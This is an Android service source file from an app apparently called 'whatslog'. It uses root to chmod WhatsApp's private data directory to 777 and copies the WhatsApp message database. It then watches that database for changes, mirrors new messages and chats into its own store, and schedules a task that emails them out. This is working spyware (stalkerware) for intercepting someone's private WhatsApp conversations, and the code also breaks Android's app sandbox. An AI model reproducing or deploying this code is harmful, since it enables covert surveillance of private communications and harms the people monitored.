package com.whatslog;

import java.io.File;
import java.io.IOException;
import java.sql.SQLException;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Binder;
import android.os.FileObserver;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import com.j256.ormlite.dao.Dao;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;
import com.whatslog.dao.DatabaseHelperConfiguracao;
import com.whatslog.dao.DatabaseHelperExternal;
import com.whatslog.dao.DatabaseHelperInternal;
import com.whatslog.model.ChatList;
import com.whatslog.model.Configuracao;
import com.whatslog.model.Messages;

public class MainService extends Service {

	private FileObserver observer;
	private String pathToWatch;
	private Dao<Messages, Integer> daoMsgInternal;
	private Dao<Messages, Integer> daoMsgExternal;
	private Dao<ChatList, Integer> daoChatInternal;
	private Dao<ChatList, Integer> daoChatExternal;

	private DatabaseHelperInternal internal;
	private DatabaseHelperExternal external;
	private Map<String, List<Messages>> listaMensagens;
	private Configuracao configuracao;
    private final IBinder mBinder = new LocalBinder();


    public class LocalBinder extends Binder {
    	MainService getService() {
            return MainService.this;
        }
    }

	public MainService() {
	}

	@Override
	public IBinder onBind(Intent intent) {
		return mBinder;
	}

	private void chmod() {

		try{
			CommandCapture command = new CommandCapture(0, "chmod -R 777 "
				+ android.os.Environment.getDataDirectory().toString()
				+ "/data/com.whatsapp", "chmod -R 777 "
						+ getApplicationContext().getPackageManager()
						.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir);
			RootTools.getShell(true).add(command);
		}catch(Exception e){
			e.printStackTrace();
		}

	}

	@Override
	public void onCreate() {

		Utils.verifyLicense(this);

		pathToWatch = android.os.Environment.getDataDirectory().toString()
				+ "/data/com.whatsapp/databases/msgstore.db";

		chmod();
		try {
			String inFileName = getApplicationContext().getPackageManager()
					.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
					+ "/databases/msgstore.db";

			File dest = new File(inFileName);

			if (!dest.exists()) {

				File source = new File(pathToWatch);
				try {

					File dir = new File(
							getApplicationContext().getPackageManager()
									.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
									+ "/databases/");
					if (!dir.exists())
						dir.mkdir();

					dest.createNewFile();
					Utils.copyFile(source, dest);
				} catch (IOException e) {
					e.printStackTrace();
				}
			}

		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}


	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// final String pathToWatch =
				// android.os.Environment.getDataDirectory().toString()+"/data/com.whatsapp/databases/msgstore.db";

				internal = new DatabaseHelperInternal(getApplicationContext());
				external = new DatabaseHelperExternal(getApplicationContext());

				try {
					daoMsgInternal = internal.getMessagesDao();
					daoMsgExternal = external.getMessagesDao();
					daoChatInternal = internal.getChatDao();
					daoChatExternal = external.getChatDao();

				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

				observer = new FileObserver(pathToWatch) { // set up a file observer to
															// watch this directory on
															// sd card

					@Override
					public void onEvent(int event, String file) {

						switch (event) {
						case FileObserver.MODIFY:
							Log.d("DEBUG", "MODIFY:" + pathToWatch + file);

							updateMsg();
							updateChat();
							break;
						default:
							// just ignore
							break;
						}

						// Toast.makeText(getBaseContext(), file + " was saved!",
						// Toast.LENGTH_LONG);
						// }
					}
				};
				observer.startWatching(); // START OBSERVING
				startMail();
				// For time consuming an long tasks you can launch a new thread here...
				Toast.makeText(this, " Service Started", Toast.LENGTH_LONG).show();
				return START_STICKY;
	}

	private void startMail(){
		if(Utils.scheduledFuture!=null){
			Utils.scheduledFuture.cancel(true);
		}
		Utils.scheduledFuture=Utils.getScheduleTaskExecutor().scheduleWithFixedDelay(new Runnable() {
			public void run() {
				HtmlHelper htmlHelper=new HtmlHelper(getApplicationContext());
				htmlHelper.sendMails();

			}
		}, 0, getConfiguracao().getIntervalo() * 60, TimeUnit.SECONDS);

	}

	public Configuracao getConfiguracao() {
		if(configuracao==null){
			DatabaseHelperConfiguracao database = new DatabaseHelperConfiguracao(
					getApplicationContext());
			List<Configuracao> confs;
			try {
				confs = database.getDao().queryForAll();
				Configuracao conf = null;

				if (confs.size() > 0) {
					conf = confs.get(0);
				}
				if (conf != null) {
					configuracao=conf;
				}
			} catch (Exception e) {
			}
		}
		return configuracao;
	}


	@Override
	public void onDestroy() {
		Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();

	}

	private void updateMsg() {

		try {
			List<Messages> mensagens = daoMsgInternal.queryForAll();
			List<Messages> m = daoMsgExternal.queryForAll();
			Set<Messages> nova = new HashSet<Messages>();
			for (Messages mensagem : m) {

				if (!mensagens.contains(mensagem)) {
					nova.add(mensagem);
				}

			}

			for (Messages mensagem : nova) {
				try {
					daoMsgInternal.create(mensagem);
				} catch (SQLException e) {
					e.printStackTrace();
				}
			}

		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void updateChat() {

		try {
			List<ChatList> chats = daoChatInternal.queryForAll();
			List<ChatList> m = daoChatExternal.queryForAll();
			Set<ChatList> nova = new HashSet<ChatList>();
			for (ChatList chat : m) {

				if (!chats.contains(chat)) {
					nova.add(chat);
				}

			}

			for (ChatList chat : nova) {
				try {
					daoChatInternal.create(chat);
				} catch (SQLException e) {
					e.printStackTrace();
				}
			}

		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}